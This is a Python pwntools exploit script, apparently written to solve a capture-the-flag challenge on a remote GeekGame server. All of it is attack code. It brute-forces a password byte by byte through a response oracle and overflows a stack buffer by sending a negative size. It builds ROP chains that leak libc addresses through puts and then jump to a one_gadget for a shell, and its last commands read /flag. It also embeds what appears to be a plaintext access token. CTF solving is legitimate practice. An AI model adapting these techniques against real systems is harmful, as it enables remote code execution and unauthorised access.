#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h']

BIN = './game'
LD = './ld-linux-x86-64.so.2'
LIBC = './libc.so.6'

PUTS_GOT = 0x404008
SAFE_RBP = PUTS_GOT + 0x200
SINK = SAFE_RBP - 0x3D
SET_RAX = 0x4011a8                    # pop rax ; add dil,dil ; loopne 0x401215 ; nop ; ret
RAX_OFF = 0x2E6B
SET_RDI_THEN_PUT = 0x4014bb                    # mov rdi, rax ; call _puts ; jmp Start

REMOTE = True
def start():
    if REMOTE:
        host = 'prob16.geekgame.pku.edu.cn'
        port = 10016
        p = remote(host, port)
        p.sendline(b"GgT-Y67HiKC-HQBvP2HZ_T2jwBwvDltljq7TNfDOfcQPnQw-gjex7OwSK6lwhUxc8TD7JAuJxZzr6Mgqfjl7Oz5PACQI")
        return p
    
    log.info("启动程序...")
    return gdb.debug(BIN, "environment env LD_PRELOAD {LIBC}; b *0x4014EB")

def recv_to_login(io):
    io.recvuntil(b"Please login to the Game World!!!\n")
    io.recvuntil(b">\n")

def send_user(io):
    io.send(b"designer\n")

def recv_to_pass(io):
    io.recvuntil(b"Please input your password:\n")
    io.recvuntil(b">\n")

def try_prefix(io, prefix: bytes):
    # 走一轮交互并判断该前缀是否正确
    recv_to_login(io)
    send_user(io)
    recv_to_pass(io)
    io.send(prefix)
    mismatch = False
    while True:
        line = io.recvline(timeout=1)
        if not line:
            return 'timeout'
        if b"Wrong Password!" in line:
            mismatch = True
        if b"Welcome to the RPG game!" in line:
            return 'success'
        if b"Password Invalid!" in line:
            return 'bad' if mismatch else 'good_prefix'

def brute_password(io):
    pw = bytearray()
    for i in range(16):
        for b in range(256):
            res = try_prefix(io, bytes(pw + bytes([b])))
            if res == 'good_prefix':
                pw.append(b)
                log.info(f"byte {i:02d} = {b:02x}")
                break
            if i == 15 and res == 'success':
                pw.append(b)
                log.info(f"byte {i:02d} = {b:02x}")
                return bytes(pw)
        else:
            raise RuntimeError(f"No match at position {i}")
    return bytes(pw)

def login(io, pwd16):
    io.recvuntil(b"Please login")
    io.recvuntil(b">\n")
    io.sendline(b"designer")
    io.recvuntil(b"Please input your password:")
    io.recvuntil(b">\n")
    io.send(pwd16)
    io.recvuntil(b"Welcome to the RPG game!")

def send_overflow(io, payload):
    io.recvuntil(b"Please input the size of your payload:")
    io.recvuntil(b">\n")
    io.sendline(b"-1")
    io.recvuntil(b"Please input your payload:")
    io.recvuntil(b">\n")
    io.send(payload)
    io.recvuntil(b"Bye!\n")

def puts_leak_bytes(io, addr, rbp):
    # 去掉末尾换行的原始字节
    payload  = b"A"*0x70
    payload += p64(rbp)
    payload += p64(SET_RAX)
    payload += p64(addr - RAX_OFF)
    payload += p64(SET_RDI_THEN_PUT)
    send_overflow(io, payload)
    line = io.recvline()
    return line.rstrip(b"\n")

def leak_ptr(io, got_addr, rbp=SAFE_RBP):
    b = puts_leak_bytes(io, got_addr, rbp)
    return u64(b.ljust(8, b"\x00"))

def exploit():
    e           = ELF(BIN)
    libc        = ELF(LIBC)
    puts_got    = e.got.get('puts', None)
    puts_offset = libc.symbols['puts']

    io = start()
    pw = brute_password(io)
    log.info(f"Password recovered: {pw.hex()}")
    
    leaked_puts = leak_ptr(io, puts_got)
    libc_base   = leaked_puts - puts_offset
    log.info(f"Leaked puts address: {hex(leaked_puts)}")
    log.info(f"Libc base: {hex(libc_base)}")

    # Bad rbp, so use zeros
    login(io, b"\x00"*16)
    log.info("The final shot!")
    payload  = b'A'*0x70
    payload += p64(SAFE_RBP + 0x200) # Make [rbp-0x78] == NULL
    payload += p64(SET_RAX)
    payload += p64(0xFFFFFFFFFFFFFFFF - RAX_OFF + 1) # Make rax == NULL
    payload += p64(libc_base + 0xef52b) # By magic, we get shell
    send_overflow(io, payload)

    io.sendline(b"cat /flag")
    log.success(io.recvline().decode())
    io.interactive()

    io.close()

if __name__ == '__main__':
    exploit()